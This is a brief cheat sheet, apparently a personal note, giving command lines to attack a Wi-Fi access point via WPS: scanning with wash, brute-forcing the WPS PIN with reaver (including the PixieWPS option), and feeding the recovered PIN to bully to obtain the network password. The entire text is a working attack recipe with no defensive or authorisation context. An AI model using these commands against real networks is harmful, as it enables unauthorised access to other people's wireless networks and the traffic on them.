After wlan0 in monitor mode:
`# wash -i wlan0mon`

Attack the AP like:
`# reaver -b <bssid> -i wlan0mon -v` (add `-K` to try the PixieWPS attack which might be faster.)
If it gets stuck, try to add the channel (gathered with `wash`) with the `-c` flag

If you opnly get the PIN, feed it to `bully` to retrieve the password like so:
`# bully -B -p <pin>`